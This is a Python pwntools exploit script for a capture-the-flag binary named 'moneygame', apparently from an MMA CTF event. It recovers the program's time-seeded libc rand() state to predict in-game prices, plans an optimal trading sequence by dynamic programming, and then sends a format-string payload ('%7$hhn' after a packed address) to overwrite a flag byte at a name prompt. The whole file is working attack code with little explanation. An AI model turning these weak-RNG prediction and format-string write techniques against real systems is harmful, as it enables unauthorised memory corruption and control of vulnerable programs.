from pwn import *
import ctypes

s = [[], [], []]

libc = ctypes.cdll.LoadLibrary('libc.so.6')
time = libc.time(0)

p = process('./moneygame')
#p = remote('pwn1.chal.mmactf.link', 21345)
p.recvuntil('[Rest] : ')
p.sendline('')

p.recvuntil('#1: $')
s[0].append(int(float(p.recvuntil(' ')[:-1]) * 100))
p.recvuntil('#2: $')
s[1].append(int(float(p.recvuntil(' ')[:-1]) * 100))
p.recvuntil('#3: $')
s[2].append(int(float(p.recvuntil(' ')[:-1]) * 100))

print s

rand = s[0][0] - 10000 + 1000
seed = -1
for v in xrange(time, time + 20):
    libc.srand(v)
    if libc.rand() % 2001 == rand:
        seed = v
        break
print 'seed: %d' % seed

libc.srand(v)
for _ in xrange(3): libc.rand()

for i in xrange(52):
    for j in xrange(3):
        a = s[j][i] + libc.rand() % 2001 - 1000
        if a <= 4999: a = 5000
        if a > 15000: a = 15000
        s[j].append(a)

f = [[0 for col in range(53)] for row in range(53)]  
f = [0 for i in xrange(53)]

f[0] = 1000000
status = {}

for i in xrange(1, 52 + 1):
    opt_ = -1
    prev = 0
    choice = -1
    for j in xrange(0, i):
        if j == 0: orig = f[0]
        else: orig = f[j - 1]
        opt = 0
        cho = -1
        for k in xrange(3):
            tmp = orig - (orig / s[k][j]) * s[k][j]
            win = (orig / s[k][j]) * s[k][i]
            if tmp + win > opt:
                opt = tmp + win
                cho = k
        if opt > opt_: 
            opt_ = opt
            choice = cho
            prev = j - 1
    f[i] = opt_
    status[i] = [prev, choice]

print 'opt value: %d' % f[52]
end = 52
lst = []
while True:
    lst.append(status[end])
    end = status[end][0]
    if end == 0 or end == -1: break

day = -1
i = 0
dec = {}
have = -1
lst.reverse()
lst.append([52, -1])
print lst
print dec
while day < 52:
    while day != lst[i][0]:
        dec[day] = 'R'
        day += 1
        if day == 52: break

    if have != -1:
        dec[day] = 'S' + str(have + 1)
        have = -1
    else:
        dec[day] = 'R'

    day += 1
    print 'memeda: %d' %  day
    if lst[i][1] != -1:
        dec[day] = 'B' + str(lst[i][1] + 1)
        have = lst[i][1]
    else:
        have = -1
        dec[day] = 'R'
    day += 1
    i += 1

if have != -1:
    dec[day] = 'S' + str(have + 1)
    have = -1
else:
    dec[day] = 'R'

raw_input('wait')

for i in xrange(0, 53):
    print p.recvuntil('[Rest] : ')    
    if dec[i] == 'R':
        p.sendline('R')
    elif dec[i][0] == 'B':
        p.sendline('B')
        p.recvuntil('(1-3) [1]: ')
        p.sendline(dec[i][1])
        p.recvuntil('to buy? (0-')
        v = p.recvuntil(')')[:-1]
        p.sendline(v)
    elif dec[i][0] == 'S':
        p.sendline('S')
        p.recvuntil('(1-3) [1]: ')
        p.sendline(dec[i][1])
        p.recvuntil('to sell? (0-')
        v = p.recvuntil(')')[:-1]
        p.sendline(v)
    else:
        assert(False)

p.recvuntil('What your name? : ')
flag_addr = 0x0804a2b8
payload = p32(flag_addr)
payload = payload.ljust(0x32, 'A')
payload += '%7$hhn'
p.sendline(payload)

p.interactive()

#for i in xrange(
#print s

p.interactive()
